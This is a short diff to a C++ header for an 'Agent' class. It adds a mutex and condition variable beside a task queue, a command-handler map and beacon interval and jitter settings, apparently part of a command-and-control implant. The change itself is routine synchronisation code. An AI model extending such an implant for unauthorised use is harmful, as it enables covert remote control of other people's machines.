@@ -1,7 +1,9 @@
 #pragma once
 #include <string>
 #include <atomic>
+#include <condition_variable>
 #include <functional>
+#include <mutex>
 #include <queue>
 #include <unordered_map>
 #include "Helpers.h"
@@ -35,8 +37,10 @@ class Agent
 {
 private:
 	AgentMetadata Metadata;
-	std::queue<Task> Tasks;
+	std::queue<Task>       Tasks;
 	std::queue<TaskResult> Results;
+	std::mutex             m_mutex;
+	std::condition_variable m_taskCv;
 	std::unordered_map<std::string, std::function<std::string(const Task&)>> Commands;
 	std::atomic<DWORD> BeaconIntervalMs;
 	std::atomic<DWORD> BeaconJitterMs;
